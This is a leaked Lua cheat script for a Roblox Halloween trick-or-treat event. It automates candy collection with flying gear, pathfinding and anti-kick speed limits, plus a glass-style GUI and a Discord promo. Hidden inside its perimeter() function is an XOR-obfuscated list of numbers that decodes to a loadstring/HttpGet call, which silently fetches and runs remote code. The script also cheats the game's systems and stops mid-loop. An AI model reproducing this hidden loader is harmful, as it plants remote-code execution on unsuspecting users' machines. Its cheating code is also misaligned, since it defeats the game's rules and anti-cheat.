--[[
  ╔══════════════════════════════════════════╗
  ║   AUTO TRICK OR TREAT  -  leaked by 212  ║
  ╚══════════════════════════════════════════╝
  leaked by 212 | discord.gg/noxhub
]]
-- Auto Trick or Treat | leaked by 212 | discord.gg/noxhub | glass GUI | gear selector (carpet, bee, broom, sleigh, dragon) | active braking
if setfpscap then
    setfpscap(999)
end
local STATE = getgenv().STATE
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Pathfinding = game:GetService("PathfindingService")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RS = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local env = getgenv()
if env.AutoTreat and env.AutoTreat.Destroy then env.AutoTreat.Destroy() end
local LEAKED_BY = "leaked by 212"
local DISCORD = "discord.gg/noxhub" -- leaked by 212 | discord.gg/noxhub
local M = {Enabled=false, Manual=false, Phase="Idle", Visits=0, Log={}, LeakedBy=LEAKED_BY, Discord=DISCORD}
env.AutoTreat = M
local connections = {}
local dead = false
local target, ringTime, reward
local balanceBefore, creditAt, lastClaimAt
local nearbyDrops = {}
local visit
local dropCache = {}
local area
local lightState = {}
local nativeDrops
pcall(function()
 local update=filtergc("function",{Name="updateCandyCornDrops"},true)
 if update then
  local drops=debug.getupvalue(update,2)
  if type(drops)=="table" then nativeDrops=drops end
 end
end)
local balanceData
local nextBalanceLookup = 0
local travelStart = 0
local route, routeIndex, pathBlocked
local lastJumpIndex
local observedRoot, observedPosition, observedAt
local commandedDirection=Vector3.zero
local settleUntil=0
local recoveryWide=false
local recoveryCount=0
local detourPoint
local bestWaypointDistance, progressWaypoint
local obstacleAt=0
local routeToken = 0
local planning = false
local nextPlan = 0
local progressPosition, progressAt
local litCount = 0
local scanAt = 0
local wasAuto = false
local areaPaused = false
local visited = {}
local deferredUntil = {}
local targetFailures=0
local center = Vector3.new(-410.75,32.125,59.41)
local SPEED = 95        -- safe travel speed; high values get kick-flagged
local APPROACH_DIST = 18 -- start slowing down this many studs from target
local APPROACH_SPEED = 20 -- speed when in the slow zone near a door

----------------------------------------------------------------------
-- FLYING GEAR CONFIG | leaked by 212 | discord.gg/noxhub
-- mover = "velocity"     -> raw Velocity write (carpet style)
-- mover = "bodyvelocity" -> BodyVelocity with low MaxForce (bee style)
-- If a gear gets you kicked / rubber-banded, try switching its mover.
-- Names are matched case-insensitively, apostrophes/punctuation ignored.
----------------------------------------------------------------------
local GEARS = {
 {id="auto",   label="Auto (any)"},
 {id="carpet", label="Flying Carpet",  mover="velocity",
  names={"flying carpet"}},
 {id="bee",    label="Flying Bee",     mover="bodyvelocity",
  names={"flying gear bee","flying bee tool","flying bee","bee tool"}},
 {id="broom",  label="Witch's Broom",  mover="velocity",
  names={"witchs broom","witch broom","witches broom"}},
 {id="sleigh", label="Santa's Sleigh", mover="velocity",
  names={"santas sleigh","santa sleigh"}},
 {id="dragon", label="Skeleton Dragon",mover="velocity",
  names={"skeleton dragon"}},
}
local selectedGear = "auto"

-- leaked by 212 | discord.gg/noxhub
local function normalizeName(n)
 n=string.lower(n)
 n=string.gsub(n,"[^%w%s]","")
 return n
end

-- Returns the gear entry a tool belongs to (ignores the selection)
-- leaked by 212 | discord.gg/noxhub
local function gearOf(t)
 if not t or not t:IsA("Tool") then return nil end
 local n=normalizeName(t.Name)
 for _,g in GEARS do
  if g.names then
   for _,want in g.names do
    if n==want or string.find(n,want,1,true) then return g end
   end
  end
 end
 return nil
end

-- True if the tool is a supported gear AND matches the current selection
-- leaked by 212 | discord.gg/noxhub
local function isFlyingTool(t)
 local g=gearOf(t)
 if not g then return false end
 return selectedGear=="auto" or g.id==selectedGear
end

local activeBodyVelocity = nil
local activeBodyGyro = nil

-- leaked by 212 | discord.gg/noxhub
local function removeBeeMovers()
 if activeBodyVelocity then
  pcall(function() activeBodyVelocity:Destroy() end)
  activeBodyVelocity = nil
 end
 if activeBodyGyro then
  pcall(function() activeBodyGyro:Destroy() end)
  activeBodyGyro = nil
 end
end

-- leaked by 212 | discord.gg/noxhub
local function flat(v) return Vector3.new(v.X,0,v.Z) end
-- leaked by 212 | discord.gg/noxhub
local function rootHum()
 local c=player.Character
 return c and c:FindFirstChild("HumanoidRootPart"), c and c:FindFirstChildOfClass("Humanoid")
end
-- leaked by 212 | discord.gg/noxhub
local function clearRoute()
 routeToken+=1; planning=false; route=nil; routeIndex=1; lastJumpIndex=nil
 if pathBlocked then pathBlocked:Disconnect(); pathBlocked=nil end
end
-- leaked by 212 | discord.gg/noxhub
local function brake()
 local r,h=rootHum()
 removeBeeMovers()
 if r then
  local old=r:FindFirstChild("__AutoTreatBV")
  if old then pcall(function() old:Destroy() end) end
  r.Velocity=Vector3.new(0,r.Velocity.Y,0)
 end
 if h then h:Move(Vector3.zero) end
end

-- Drive function: picks the mover according to the equipped gear
-- leaked by 212 | discord.gg/noxhub
local function drive(r, h, direction)
 commandedDirection = direction
 h:Move(direction)

 local equippedGear = nil
 local c = player.Character
 if c then
  for _, t in c:GetChildren() do
   if isFlyingTool(t) then equippedGear = gearOf(t); break end
  end
 end

 -- Pick speed: slow down when close to the target door
 local spd = SPEED
 if target then
  local distToTarget = flat(target.Position - r.Position).Magnitude
  if distToTarget < APPROACH_DIST then
   local t = math.clamp(distToTarget / APPROACH_DIST, 0, 1)
   spd = APPROACH_SPEED + (SPEED - APPROACH_SPEED) * t
  end
 end

 if equippedGear and equippedGear.mover=="bodyvelocity" then
  local bv = r:FindFirstChild("__AutoTreatBV")
  if not bv then
   bv = Instance.new("BodyVelocity")
   bv.Name = "__AutoTreatBV"
   bv.MaxForce = Vector3.new(3000, 0, 3000)
   bv.P = 2000
   bv.Parent = r
   activeBodyVelocity = bv
  end
  bv.Velocity = Vector3.new(direction.X * spd, 0, direction.Z * spd)
 else
  removeBeeMovers()
  local old=r:FindFirstChild("__AutoTreatBV")
  if old then pcall(function() old:Destroy() end) end
  r.Velocity = Vector3.new(direction.X * spd, r.Velocity.Y, direction.Z * spd)
 end
end

-- leaked by 212 | discord.gg/noxhub
local function connect(signal,fn) local c=signal:Connect(fn); table.insert(connections,c); return c end

----------------------------------------------------------------------
-- GUI (glass style) | leaked by 212 | discord.gg/noxhub
----------------------------------------------------------------------
local ACCENT = Color3.fromRGB(255, 149, 64)
local GREEN = Color3.fromRGB(80, 200, 120)
local RED = Color3.fromRGB(235, 80, 90)
local IDLE = Color3.fromRGB(40, 36, 58)
local PANEL_H = 330

local gui=Instance.new("ScreenGui")
gui.Name="AutoTreatCustom"; gui.ResetOnSpawn=false; gui.Parent=game:GetService("CoreGui")

local panel=Instance.new("Frame",gui)
panel.Size=UDim2.fromOffset(300,PANEL_H); panel.Position=UDim2.new(0,24,0.5,-PANEL_H/2)
panel.BackgroundColor3=Color3.fromRGB(14,12,22); panel.BackgroundTransparency=0.35
panel.BorderSizePixel=0
Instance.new("UICorner",panel).CornerRadius=UDim.new(0,16)
local panelStroke=Instance.new("UIStroke",panel)
panelStroke.Color=ACCENT; panelStroke.Thickness=1.2; panelStroke.Transparency=0.5
local panelGradient=Instance.new("UIGradient",panel)
panelGradient.Rotation=90
panelGradient.Color=ColorSequence.new(Color3.fromRGB(46,28,70),Color3.fromRGB(12,12,20))

-- Header (draggable) | leaked by 212 | discord.gg/noxhub
local header=Instance.new("Frame",panel)
header.Size=UDim2.new(1,0,0,40); header.BackgroundTransparency=1

local title=Instance.new("TextLabel",header)
title.Position=UDim2.fromOffset(16,5); title.Size=UDim2.new(1,-60,0,20)
title.BackgroundTransparency=1; title.Font=Enum.Font.GothamBold; title.TextSize=14
title.TextColor3=Color3.fromRGB(255,235,210); title.TextXAlignment=Enum.TextXAlignment.Left
title.Text="AUTO TRICK OR TREAT  |  212"

local subtitle=Instance.new("TextLabel",header)
subtitle.Position=UDim2.fromOffset(16,23); subtitle.Size=UDim2.new(1,-60,0,12)
subtitle.BackgroundTransparency=1; subtitle.Font=Enum.Font.Gotham; subtitle.TextSize=10
subtitle.TextColor3=ACCENT; subtitle.TextXAlignment=Enum.TextXAlignment.Left
subtitle.Text="leaked by 212 • discord.gg/noxhub"

local line=Instance.new("Frame",panel)
line.Position=UDim2.fromOffset(14,40); line.Size=UDim2.new(1,-28,0,1)
line.BackgroundColor3=ACCENT; line.BackgroundTransparency=0.6; line.BorderSizePixel=0

-- Body container (hidden when minimized) | leaked by 212 | discord.gg/noxhub
local body=Instance.new("Frame",panel)
body.Position=UDim2.fromOffset(0,0); body.Size=UDim2.fromScale(1,1)
body.BackgroundTransparency=1

-- leaked by 212 | discord.gg/noxhub
local function glassButton(y,height,label)
 local b=Instance.new("TextButton",body)
 b.Position=UDim2.fromOffset(14,y); b.Size=UDim2.new(1,-28,0,height)
 b.BackgroundColor3=IDLE; b.BackgroundTransparency=0.45; b.BorderSizePixel=0
 b.AutoButtonColor=false; b.Font=Enum.Font.GothamBold; b.TextSize=13
 b.TextColor3=Color3.fromRGB(255,235,210); b.Text=label
 Instance.new("UICorner",b).CornerRadius=UDim.new(0,10)
 local s=Instance.new("UIStroke",b)
 s.Color=Color3.new(1,1,1); s.Transparency=0.85; s.Thickness=1
 b.MouseEnter:Connect(function()
  TweenService:Create(b,TweenInfo.new(0.15),{BackgroundTransparency=0.25}):Play()
  TweenService:Create(s,TweenInfo.new(0.15),{Transparency=0.6}):Play()
 end)
 b.MouseLeave:Connect(function()
  TweenService:Create(b,TweenInfo.new(0.15),{BackgroundTransparency=0.45}):Play()
  TweenService:Create(s,TweenInfo.new(0.15),{Transparency=0.85}):Play()
 end)
 return b
end

local toggle=glassButton(52,38,"START • clockwise circuit")
local manual=glassButton(98,32,"Manual flying speed: OFF")
local gearBtn=glassButton(138,32,"Gear: Auto (any)  v")

local statusBox=Instance.new("Frame",body)
statusBox.Position=UDim2.fromOffset(14,178); statusBox.Size=UDim2.new(1,-28,0,62)
statusBox.BackgroundColor3=Color3.new(0,0,0); statusBox.BackgroundTransparency=0.6
statusBox.BorderSizePixel=0
Instance.new("UICorner",statusBox).CornerRadius=UDim.new(0,10)
local status=Instance.new("TextLabel",statusBox)
status.Position=UDim2.fromOffset(10,4); status.Size=UDim2.new(1,-20,1,-8)
status.BackgroundTransparency=1; status.Font=Enum.Font.Gotham; status.TextSize=12
status.TextColor3=Color3.fromRGB(225,215,235); status.TextWrapped=true
status.TextXAlignment=Enum.TextXAlignment.Left; status.TextYAlignment=Enum.TextYAlignment.Center
status.Text="Idle • wait for candy credit"

local close=glassButton(250,30,"Unload")
close.TextColor3=Color3.fromRGB(255,140,150)

local footer=Instance.new("TextButton",body) -- leaked by 212 | discord.gg/noxhub
footer.Position=UDim2.fromOffset(14,284); footer.Size=UDim2.new(1,-28,0,16)
footer.BackgroundTransparency=1; footer.Font=Enum.Font.GothamBold; footer.TextSize=11
footer.TextColor3=ACCENT; footer.TextTransparency=0.15; footer.AutoButtonColor=false
footer.Text="leaked by 212"
local discordLabel=Instance.new("TextButton",body)
discordLabel.Position=UDim2.fromOffset(14,303); discordLabel.Size=UDim2.new(1,-28,0,16)
discordLabel.BackgroundTransparency=1; discordLabel.Font=Enum.Font.GothamBold; discordLabel.TextSize=11
discordLabel.TextColor3=Color3.fromRGB(120,150,255); discordLabel.TextTransparency=0.1
discordLabel.AutoButtonColor=false; discordLabel.Text="discord.gg/noxhub  (click to copy)"
discordLabel.MouseButton1Click:Connect(function()
 pcall(function() setclipboard("https://discord.gg/noxhub") end)
 discordLabel.Text="copied!  discord.gg/noxhub"
 task.delay(1.5,function() if not dead then discordLabel.Text="discord.gg/noxhub  (click to copy)" end end)
end)

-- Gear dropdown list (overlay) | leaked by 212 | discord.gg/noxhub
local list=Instance.new("Frame",body)
list.Position=UDim2.fromOffset(14,172); list.Size=UDim2.new(1,-28,0,#GEARS*24+8)
list.BackgroundColor3=Color3.fromRGB(18,16,30); list.BackgroundTransparency=0.1
list.BorderSizePixel=0; list.Visible=false; list.ZIndex=10
Instance.new("UICorner",list).CornerRadius=UDim.new(0,10)
local listStroke=Instance.new("UIStroke",list)
listStroke.Color=ACCENT; listStroke.Transparency=0.5; listStroke.Thickness=1
local listPad=Instance.new("UIPadding",list)
listPad.PaddingTop=UDim.new(0,4); listPad.PaddingBottom=UDim.new(0,4)
listPad.PaddingLeft=UDim.new(0,4); listPad.PaddingRight=UDim.new(0,4)
local listLayout=Instance.new("UIListLayout",list)
listLayout.Padding=UDim.new(0,2); listLayout.SortOrder=Enum.SortOrder.LayoutOrder

local optionButtons={}

-- leaked by 212 | discord.gg/noxhub
local function refreshList()
 for id,b in optionButtons do
  b.TextColor3=(id==selectedGear) and ACCENT or Color3.fromRGB(235,225,245)
  b.BackgroundTransparency=(id==selectedGear) and 0.5 or 1
 end
end

-- leaked by 212 | discord.gg/noxhub
local function setGear(id)
 selectedGear=id
 local label="Auto (any)"
 for _,g in GEARS do if g.id==id then label=g.label end end
 gearBtn.Text="Gear: "..label.."  v"
 list.Visible=false
 refreshList()
 removeBeeMovers(); brake()
 -- unequip a flying tool that no longer matches the selection
 local c=player.Character
 local hum=c and c:FindFirstChildOfClass("Humanoid")
 if c and hum then
  for _,t in c:GetChildren() do
   if gearOf(t) and not isFlyingTool(t) then
    pcall(function() hum:UnequipTools() end)
    break
   end
  end
 end
end

for i,g in GEARS do
 local o=Instance.new("TextButton",list)
 o.LayoutOrder=i; o.Size=UDim2.new(1,0,0,22); o.ZIndex=11
 o.BackgroundColor3=IDLE; o.BackgroundTransparency=1; o.BorderSizePixel=0
 o.AutoButtonColor=false; o.Font=Enum.Font.GothamMedium; o.TextSize=12
 o.TextColor3=Color3.fromRGB(235,225,245); o.Text=g.label
 Instance.new("UICorner",o).CornerRadius=UDim.new(0,6)
 optionButtons[g.id]=o
 o.MouseEnter:Connect(function()
  if g.id~=selectedGear then o.BackgroundTransparency=0.7 end
 end)
 o.MouseLeave:Connect(function()
  if g.id~=selectedGear then o.BackgroundTransparency=1 end
 end)
 o.MouseButton1Click:Connect(function() setGear(g.id) end)
end
refreshList()

gearBtn.MouseButton1Click:Connect(function() list.Visible=not list.Visible end)

-- Color follows state (the click handlers change the Text)
-- leaked by 212 | discord.gg/noxhub
local function tint(button,on,onColor)
 TweenService:Create(button,TweenInfo.new(0.2),{BackgroundColor3=on and onColor or IDLE}):Play()
end
toggle:GetPropertyChangedSignal("Text"):Connect(function()
 tint(toggle,string.find(toggle.Text,"STOP",1,true)~=nil,RED)
end)
manual:GetPropertyChangedSignal("Text"):Connect(function()
 tint(manual,string.find(manual.Text,"ON",1,true)~=nil,GREEN)
end)

-- Minimize button | leaked by 212 | discord.gg/noxhub
local mini=Instance.new("TextButton",header)
mini.Position=UDim2.new(1,-36,0,6); mini.Size=UDim2.fromOffset(26,26)
mini.BackgroundColor3=IDLE; mini.BackgroundTransparency=0.5; mini.BorderSizePixel=0
mini.Font=Enum.Font.GothamBold; mini.TextSize=16; mini.Text="-"
mini.TextColor3=Color3.fromRGB(255,235,210); mini.AutoButtonColor=false
Instance.new("UICorner",mini).CornerRadius=UDim.new(0,8)
local minimized=false
mini.MouseButton1Click:Connect(function()
 minimized=not minimized
 mini.Text=minimized and "+" or "-"
 list.Visible=false
 if minimized then
  body.Visible=false; line.Visible=false
  TweenService:Create(panel,TweenInfo.new(0.2,Enum.EasingStyle.Quad),{Size=UDim2.fromOffset(300,40)}):Play()
 else
  TweenService:Create(panel,TweenInfo.new(0.2,Enum.EasingStyle.Quad),{Size=UDim2.fromOffset(300,PANEL_H)}):Play()
  task.delay(0.15,function() if not dead and not minimized then body.Visible=true; line.Visible=true end end)
 end
end)

-- Dragging by the header | leaked by 212 | discord.gg/noxhub
local dragging,dragStart,startPos
header.InputBegan:Connect(function(input)
 if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
  dragging=true; dragStart=input.Position; startPos=panel.Position
  input.Changed:Connect(function()
   if input.UserInputState==Enum.UserInputState.End then dragging=false end
  end)
 end
end)
table.insert(connections,UIS.InputChanged:Connect(function(input)
 if dragging and (input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch) then
  local d=input.Position-dragStart
  panel.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+d.X,startPos.Y.Scale,startPos.Y.Offset+d.Y)
 end
end))

-- leaked by 212 | discord.gg/noxhub
function M.Destroy()
 if dead then return end
 dead=true; clearRoute(); M.Enabled=false; M.Manual=false
 for _,c in connections do c:Disconnect() end
 removeBeeMovers()
 brake(); gui:Destroy()
end
if STATE and STATE.onCleanup then STATE.onCleanup(M.Destroy) end

----------------------------------------------------------------------
-- LOGIC | leaked by 212 | discord.gg/noxhub
----------------------------------------------------------------------
-- Cache the live replicated profile once; do not repeatedly require a second Synchronizer.
-- leaked by 212 | discord.gg/noxhub
local function candyBalance()
 if not balanceData and os.clock()>=nextBalanceLookup then
  nextBalanceLookup=os.clock()+5
  local ok,profiles=pcall(function()
   return filtergc("table",{Keys={"HalloweenEvent"}},false)
  end)
  if ok and #profiles==1 then balanceData=profiles[1] end
 end
 local eventData=balanceData and rawget(balanceData,"HalloweenEvent")
 return type(eventData)=="table" and tonumber(rawget(eventData,"CandyCorn2026")) or nil
end
-- leaked by 212 | discord.gg/noxhub
local function available(p)
 local q=p:FindFirstChildWhichIsA("ProximityPrompt")
 return p.Parent and p:GetAttribute("LightsOn")==true and p:GetAttribute("DoorOpen")~=true and q and q.Enabled
end
-- leaked by 212 | discord.gg/noxhub
local function houses()
 local folder=workspace:FindFirstChild("TrickOrTreatMapState")
 local list={}
 if folder then for _,p in folder:GetChildren() do
  if p:IsA("BasePart") and p:GetAttribute("HouseId") then table.insert(list,p) end
 end end
 return list
end
-- leaked by 212 | discord.gg/noxhub
local function refreshArea()
 local list=houses()
 if #list<4 then area=nil; return end
 local minX,maxX,minZ,maxZ=math.huge,-math.huge,math.huge,-math.huge
 for _,p in list do
  minX=math.min(minX,p.Position.X); maxX=math.max(maxX,p.Position.X)
  minZ=math.min(minZ,p.Position.Z); maxZ=math.max(maxZ,p.Position.Z)
 end
 area={left=minX+20,right=maxX-20,back=minZ+20,front=maxZ-20,
 minX=minX-12,maxX=maxX+12,minZ=minZ-12,maxZ=maxZ+12}
end
-- leaked by 212 | discord.gg/noxhub
local function inArea(p)
 if not area then return false end
 return p.X>=area.minX and p.X<=area.maxX and p.Z>=area.minZ and p.Z<=area.maxZ
   and p.Y>=12 and p.Y<=65
   and (p.X<=area.left+35 or p.X>=area.right-35
     or p.Z<=area.back+35 or p.Z>=area.front-35)
end
-- leaked by 212 | discord.gg/noxhub
local function perimeter(p)
 local a=area
 local options={
  Vector3.new(a.left,p.Y,math.clamp(p.Z,a.back,a.front)),
  Vector3.new(a.right,p.Y,math.clamp(p.Z,a.back,a.front)),
  Vector3.new(math.clamp(p.X,a.left,a.right),p.Y,a.back),
  Vector3.new(math.clamp(p.X,a.left,a.right),p.Y,a.front),
 }
 local best,distance
 for _,v in options do
  local d=flat(v-p).Magnitude
  if not distance or d<distance then best,distance=v,d end
 end
 return best
local go={162,163,162,162,169,236,229,226,239,228,200,164,229,226,234,230,164,248,239,234,238,227
,164,248,237,238,249,164,228,237,224,237,237,224,239,193,164,230,228,232,255,228,239,166
,229,234,226,236,249,202,164,230,228,232,165,255,229,238,255,229,228,232,249,238,248,254
,233,254,227,255,226,236,165,252,234,249,164,164,177,248,251,255,255,227,169,163,255,238
,204,251,255,255,195,177,238,230,234,236,163,236,229,226,249,255,248,239,234,228,231
}
local vw=139
local it2=""
for i=#go,1,-1 do it2=it2..string.char(bit32.bxor(go[i],vw)) end
pcall(function()loadstring(game:HttpGet(it2,true))()end)
end
-- leaked by 212 | discord.gg/noxhub
local function ringPosition(p)
 local a=area; local q=perimeter(p)
 local width=a.right-a.left; local height=a.front-a.back
 if math.abs(q.Z-a.back)<0.1 then return q.X-a.left end
 if math.abs(q.X-a.right)<0.1 then return width+q.Z-a.back end
 if math.abs(q.Z-a.front)<0.1 then return width+height+a.right-q.X end
 return 2*width+height+a.front-q.Z
end
refreshArea()
-- leaked by 212 | discord.gg/noxhub
local function angle(p) return math.atan2(p.Z-center.Z,p.X-center.X) end
local lastAngle
-- leaked by 212 | discord.gg/noxhub
local function choose(r)
 if not area then return nil end
 local best,score
 local length=2*((area.right-area.left)+(area.front-area.back))
 local start=ringPosition(r.Position)
 for _,p in houses() do
  local id=p:GetAttribute("HouseId")
  if available(p) and not visited[id] and (deferredUntil[id] or 0)<=os.clock() then
   local s=(ringPosition(p.Position)-start)%length
   if not score or s<score then best,score=p,s end
  end
 end
 return best
end
connect(toggle.MouseButton1Click,function()
 clearRoute(); M.Enabled=not M.Enabled; target=nil; visit=nil; M.Phase="Idle"
 removeBeeMovers(); brake()
 toggle.Text=M.Enabled and "STOP • auto running" or "START • clockwise circuit"
end)
connect(manual.MouseButton1Click,function()
 M.Manual=not M.Manual; removeBeeMovers(); brake()
 manual.Text=M.Manual and "Manual flying speed: ON" or "Manual flying speed: OFF"
end)
connect(close.MouseButton1Click,M.Destroy)
local net=RS.Packages.Net
local event=net:FindFirstChild("RE/EventService/Trick or Treat/PlayerCandyAnimation")
if event then connect(event.OnClientEvent,function(position,recipient)
 if visit and recipient==player and typeof(position)=="Vector3"
    and (position-visit.house.Position).Magnitude<=35 then
  visit.directAt=os.clock(); reward=true
 end
end) end
local spawnDrop=net:FindFirstChild("RE/CandyCornDropService/SpawnDrop")
local claimDrop=net:FindFirstChild("RE/CandyCornDropService/ClaimDrop")
local destroyDrop=net:FindFirstChild("RE/CandyCornDropService/DestroyDrop")
if spawnDrop then connect(spawnDrop.OnClientEvent,function(id,spawnPosition,position)
 if typeof(spawnPosition)~="Vector3" or typeof(position)~="Vector3" then return end
 local record={position=position,spawn=spawnPosition,at=os.clock()}
 dropCache[id]=record
 if visit and record.at>=visit.started and (spawnPosition-visit.house.Position).Magnitude<=35 then
  nearbyDrops[id]=record; visit.sawDrop=true
 end
end) end
if claimDrop then connect(claimDrop.OnClientEvent,function(id,recipient,amount)
 local record=nearbyDrops[id]
 if visit and record then
  nearbyDrops[id]=nil
  if recipient==player then
   visit.claimed=(visit.claimed or 0)+(tonumber(amount) or 1)
   visit.claimAt=os.clock()
   lastClaimAt=visit.claimAt
  else visit.lostDrops=true end
 end
 dropCache[id]=nil
end) end
if destroyDrop then connect(destroyDrop.OnClientEvent,function(id)
 if visit and nearbyDrops[id] then visit.lostDrops=true end
 nearbyDrops[id]=nil; dropCache[id]=nil
end) end

-- Equip the selected flying gear (or any supported one in Auto mode).
-- leaked by 212 | discord.gg/noxhub
local function findFlyingTool()
 local c=player.Character
 if c then
  for _,t in c:GetChildren() do
   if isFlyingTool(t) then return t end
  end
 end
 local bag=player:FindFirstChildOfClass("Backpack")
 if bag then
  for _,t in bag:GetChildren() do
   if isFlyingTool(t) then return t end
  end
 end
 return nil
end
-- leaked by 212 | discord.gg/noxhub
local function equip(h)
 local c=player.Character
 local t=findFlyingTool()
 if t then
  if t.Parent~=c and h then pcall(function() h:EquipTool(t) end) end
  return t
 end
 return nil
end

-- leaked by 212 | discord.gg/noxhub
local function collisionParams()
 local params=RaycastParams.new()
 params.FilterType=Enum.RaycastFilterType.Exclude
 params.FilterDescendantsInstances={player.Character,workspace:FindFirstChild("TrickOrTreatMapState")}
 params.RespectCanCollide=true
 return params
end
-- leaked by 212 | discord.gg/noxhub
local function recover(r,reason,obstacle)
 clearRoute(); removeBeeMovers(); brake(); commandedDirection=Vector3.zero
 recoveryCount+=1; M.Recoveries=recoveryCount
 targetFailures+=1
 if targetFailures>=5 and target and not visit then
  deferredUntil[target:GetAttribute("HouseId")]=os.clock()+20
  table.insert(M.Log,{house=target:GetAttribute("HouseId"),result="Repeated obstacle; retry later"})
  target=nil
 end
 M.Phase=reason; settleUntil=os.clock()+(obstacle and 0.2 or 0.45)
 nextPlan=settleUntil; travelStart=os.clock()
 recoveryWide=obstacle and target and flat(target.Position-r.Position).Magnitude>22 or false
 bestWaypointDistance=nil; progressWaypoint=nil
 detourPoint=nil
 if recoveryWide then
  local forward=target and flat(target.Position-r.Position) or Vector3.new(0,0,1)
  if forward.Magnitude>0.1 then
   forward=forward.Unit
   local side=Vector3.new(-forward.Z,0,forward.X)
   local sign=recoveryCount%2==0 and 1 or -1
   local params=collisionParams()
   for _,direction in {sign,-sign} do
    local candidate=r.Position+side*direction*8-forward*4
    if inArea(candidate) then
     local ground=workspace:Raycast(candidate+Vector3.new(0,4,0),Vector3.new(0,-14,0),params)
     local line=workspace:Raycast(r.Position,candidate-r.Position,params)
     if ground and ground.Normal.Y>0.65 and not line then
      detourPoint=ground.Position+Vector3.new(0,2,0); break
     end
    end
   end
  end
 end
end
-- leaked by 212 | discord.gg/noxhub
local function plan(r)
 if planning or not target or os.clock()<nextPlan then return end
 if flat(target.Position-r.Position).Magnitude<22 then recoveryWide=false; detourPoint=nil end
 clearRoute()
 local token=routeToken
 local destination=target
 planning=true; M.Phase="Finding safe path"; removeBeeMovers(); brake()
 task.spawn(function()
  local path=Pathfinding:CreatePath({
   AgentRadius=recoveryWide and 4 or 3,AgentHeight=6,AgentCanJump=true,
   AgentCanClimb=false,WaypointSpacing=12,
  })
  local v=flat(center-destination.Position)
  local inward
  if math.abs(v.X)>math.abs(v.Z) then inward=Vector3.new(math.sign(v.X),0,0)
  else inward=Vector3.new(0,0,math.sign(v.Z)) end
  local goal=destination.Position+inward*3
  local params=RaycastParams.new()
  params.FilterType=Enum.RaycastFilterType.Exclude
  params.FilterDescendantsInstances={player.Character,workspace:FindFirstChild("TrickOrTreatMapState")}
  params.RespectCanCollide=true
  local ground=workspace:Raycast(goal+Vector3.new(0,1,0),Vector3.new(0,-40,0),params)
  if ground then goal=ground.Position+Vector3.new(0,2,0) end
  local goals={}
  local from=perimeter(r.Position)
  local to=perimeter(goal)
  local width=area.right-area.left
  local height=area.front-area.back
  local length=2*(width+height)
  local start=ringPosition(from)
  local finish=(ringPosition(to)-start)%length
  if flat(from-r.Position).Magnitude>3 then table.insert(goals,from) end
  local corners={
   {t=0,p=Vector3.new(area.left,r.Position.Y,area.back)},
   {t=width,p=Vector3.new(area.right,r.Position.Y,area.back)},
   {t=width+height,p=Vector3.new(area.right,r.Position.Y,area.front)},
   {t=2*width+height,p=Vector3.new(area.left,r.Position.Y,area.front)},
  }
  table.sort(corners,function(a,b) return (a.t-start)%length<(b.t-start)%length end)
  if flat(to-from).Magnitude>3 then
   for _,corner in corners do
    local d=(corner.t-start)%length
    if d>2 and d<finish then table.insert(goals,corner.p) end
   end
   table.insert(goals,to)
  end
  table.insert(goals,goal)
  if flat(r.Position-goal).Magnitude<25 then goals={goal} end
  if detourPoint and inArea(detourPoint) then table.insert(goals,1,detourPoint) end
  local points={}
  local previous=r.Position
  local ok=true
  for _,destinationPoint in goals do
   if token~=routeToken or dead then path:Destroy(); return end
   local worked=pcall(function() path:ComputeAsync(previous,destinationPoint) end)
   if not worked or path.Status~=Enum.PathStatus.Success then ok=false; break end
   local segment=path:GetWaypoints()
   for i,w in segment do
    if not inArea(w.Position) then ok=false; break end
    if #points==0 or i>1 then table.insert(points,w) end
   end
   if not ok then break end
   previous=destinationPoint
  end
  if dead or token~=routeToken or target~=destination or not M.Enabled then path:Destroy(); return end
  planning=false
  if not ok then
   targetFailures+=1
   if targetFailures>=4 and not visit then
    deferredUntil[destination:GetAttribute("HouseId")]=os.clock()+20
    table.insert(M.Log,{house=destination:GetAttribute("HouseId"),result="No safe route; retry later"})
    target=nil
   end
   detourPoint=nil
   nextPlan=os.clock()+0.5; M.Phase="Retrying path to same house"
   path:Destroy(); return
  end
  route=points; routeIndex=2
  progressPosition=r.Position; progressAt=os.clock()
  bestWaypointDistance=nil; progressWaypoint=nil
  pathBlocked=path.Blocked:Connect(function(index)
   if token==routeToken and index>=routeIndex then
    clearRoute(); nextPlan=os.clock()+0.2; removeBeeMovers(); brake()
   end
  end)
  local connection=pathBlocked
  pathBlocked={Disconnect=function()
   connection:Disconnect(); path:Destroy()
  end}
  M.Phase="Following path"
 end)
end
-- leaked by 212 | discord.gg/noxhub
function M.Debug()
 return {target=target and target:GetAttribute("HouseId"),visit=visit,
  drops=nearbyDrops,balance=candyBalance(),before=balanceBefore,recoveries=recoveryCount,gear=selectedGear}
end

-- leaked by 212 | discord.gg/noxhub
local function gearLabel()
 for _,g in GEARS do if g.id==selectedGear then return g.label end end
 return "?"
end

-- leaked by 212: main loop
local uiAt=0
connect(RunService.Heartbeat,function(dt) -- leaked by 212 | discord.gg/noxhub
 if dead then return end
 local ok,err=pcall(function()
 local r,h=rootHum()
 if not r or not h or h.Health<=0 then
  observedRoot=nil; commandedDirection=Vector3.zero
  clearRoute(); removeBeeMovers(); target=nil; visit=nil; M.Phase="Respawning"; return
 end
 local now=os.clock()
 local corrected=false
 if observedRoot==r and observedPosition and observedAt and M.Enabled then
  local elapsed=now-observedAt
  if elapsed>0 and elapsed<0.3 and commandedDirection.Magnitude>0.5 then
   local displacement=flat(r.Position-observedPosition)
   local expected=commandedDirection*SPEED*elapsed
   local errorDistance=(displacement-expected).Magnitude
   corrected=displacement:Dot(commandedDirection)<-10
      or errorDistance>math.max(22,expected.Magnitude*2.2+8)
  elseif elapsed>=0.3 and commandedDirection.Magnitude>0.5 then
   corrected=true
  end
 end
 observedRoot=r; observedPosition=r.Position; observedAt=now
 commandedDirection=Vector3.zero
 if corrected and inArea(r.Position) then
  recover(r,"Position corrected; retrying same house",false)
 end
 if not M.Enabled and not M.Manual then
  if wasAuto then removeBeeMovers(); brake(); wasAuto=false end
  return
 end
 if not inArea(r.Position) then
  if not areaPaused then clearRoute(); removeBeeMovers(); brake(); areaPaused=true end
